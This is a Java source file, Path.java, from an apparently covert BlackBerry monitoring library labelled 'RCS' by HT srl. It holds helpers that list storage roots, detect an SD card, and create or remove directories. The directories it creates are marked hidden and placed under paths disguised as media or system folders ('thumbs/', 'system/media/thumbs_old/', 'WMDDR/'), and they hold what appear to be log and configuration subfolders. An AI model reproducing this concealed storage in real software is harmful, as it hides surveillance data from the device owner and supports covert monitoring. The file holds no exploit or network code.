//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Path.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.fs;

import java.io.IOException;
import java.util.Enumeration;
import java.util.Random;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import javax.microedition.io.file.FileSystemRegistry;

import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Path.
 */
public final class Path {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);
    //#endif

    public static final int SD = 0;
    public static final int USER = 1;
    
    public static final String[] SD_PATHS = { "dvz_temp/wmddr/",
            "system/media/thumbs_old/", "system/WMDDR/", "WMDDR/" };

    /** The Constant SD_PATH. */
    public static final String SD_BASE_PATH = "file:///SDCard/BlackBerry/";
    public static final String USER_BASE_PATH = "file:///store/home/user/";

    //public static final String SD_PATH = "file:///SDCard/BlackBerry/system/WMDDR/";
    //public static final String SD_PATH = "file:///SDCard/BlackBerry/dvz_temp/wmddr/";
    //public static final String SD_PATH = "file:///SDCard/BlackBerry/system/media/thumbs_old/";

    public static String SD_PATH = SD_BASE_PATH + "thumbs/";

    /** The Constant USER_PATH. */
    public static final String USER_PATH = USER_BASE_PATH + "wmddr/";

    /** The Constant LOG_DIR_BASE. */
    public static final String LOG_DIR_BASE = "1";

    /** The Constant MARKUP_DIR. */
    public static final String MARKUP_DIR = "2/";

    /** The Constant CONF_DIR. */
    public static final String CONF_DIR = "2/";

    //public static final String LOG_PATH = SD_PATH;

    /**
     * Crea la directory specificata e la rende hidden. Non crea ricosivamente
     * le directory.
     * 
     * @param dirName
     *            nome della directory, deve finire con /
     * @return true, if successful
     */
    public static synchronized boolean createDirectory(final String dirName) {
        FileConnection fconn = null;

        //#ifdef DBC
        Check.ensures(dirName.endsWith("/"), "directory should end with /");
        //#endif

        try {
            fconn = (FileConnection) Connector.open(dirName,
                    Connector.READ_WRITE);

            if (fconn.exists()) {
                return true;
            }

            fconn.mkdir();
            fconn.setHidden(true);

            //#ifdef DBC
            Check.ensures(fconn.exists(), "Couldn't create dir");
            //#endif

        } catch (final IOException e) {

            //#ifdef DEBUG
            debug.error(dirName + " ex: " + e.toString());

            //#endif
            return false;

        } finally {
            if (fconn != null) {
                try {
                    fconn.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    if (debug != null) {
                        debug.error(dirName + " ex: " + e.toString());
                    }
                    //#endif

                }
            }
        }

        return true;
    };

    /**
     * Gets the roots.
     * 
     * @return the roots
     */
    public static Vector getRoots() {
        final Enumeration roots = FileSystemRegistry.listRoots();
        final Vector vector = new Vector();

        while (roots.hasMoreElements()) {
            final String root = (String) roots.nextElement();
            vector.addElement(root);

            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                //#ifdef DEBUG_INFO
                debug.info(root + " " + fc.availableSize());
                //#endif
            } catch (final IOException e) {
                //#ifdef DEBUG
                debug.error(root + " " + e);
                //#endif
                e.printStackTrace();
            }
        }

        return vector;
    }

    /**
     * Checks if the SD is present.
     * 
     * @return true, if is SD present
     */
    public static boolean isSDPresent() {
        final Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            final String path = (String) roots.nextElement();

            if (path.indexOf("SDCard") >= 0) {
                //#ifdef DEBUG
                if (debug != null) {
                    debug.info("SDPresent FOUND: " + path);
                }
                //#endif
                return true;
            } else {
                //#ifdef DEBUG
                if (debug != null) {
                    debug.trace("SDPresent NOT:" + path);
                }
                //#endif
            }
        }

        return false;
    }

    /**
     * Crea le directory iniziali.
     * 
     * @param sd 
     *            true: crea su SD. false: crea su flash
     * @return true se riesce a scrivere le directory, false altrimenti
     */
    public static boolean makeDirs(final int sd ) {
        Path.getRoots();

        boolean ret = true;
        final Random random = new Random();
        String base;
        if (sd == SD) {
            base = Path.SD_PATH;

        } else {
            base = Path.USER_PATH;
        }

        ret &= createDirectory(base);
        // createDirectory(Path.SD_PATH + Path.LOG_DIR);
        ret &= createDirectory(base + Path.MARKUP_DIR);
        ret &= createDirectory(base + Path.CONF_DIR);

        long rnd = Math.abs(random.nextLong());
        
        if (ret) {
            ret &= createDirectory(base + rnd + "/");
            ret &= removeDirectory(base + rnd + "/");
        }

        return ret;
    }

    /**
     * Prints the roots.
     */
    public static void printRoots() {
        final Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            final String root = (String) roots.nextElement();
            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                System.out.println(root + " " + fc.availableSize());
            } catch (final IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    /**
     * Rimuove la directory specificata, solo se vuota.
     * 
     * @param dirName
     *            the dir name
     * @return true, if successful
     */
    public static boolean removeDirectory(final String dirName) {
        FileConnection fconn = null;
        try {
            fconn = (FileConnection) Connector.open(dirName,
                    Connector.READ_WRITE);

            if (!fconn.exists()) {
                //#ifdef DEBUG
                if (debug != null) {
                    debug.trace("Directory doesn't exists");
                }
                //#endif

                return false;
            }

            if (!fconn.list().hasMoreElements()) {
                fconn.delete();
            } else {
                //#ifdef DEBUG
                debug.error("directory not empty");
                //#endif
                return false;
            }

            //#ifdef DBC
            Check.ensures(!fconn.exists(), "Couldn't delete dir");
            //#endif

        } catch (final IOException e) {

            e.printStackTrace();
            return false;

        } finally {
            if (fconn != null) {
                try {
                    fconn.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    if (debug != null) {
                        debug.error(e.toString());
                    }
                    //#endif
                }
            }
        }
        return true;
    }

    private Path() {
    }
}
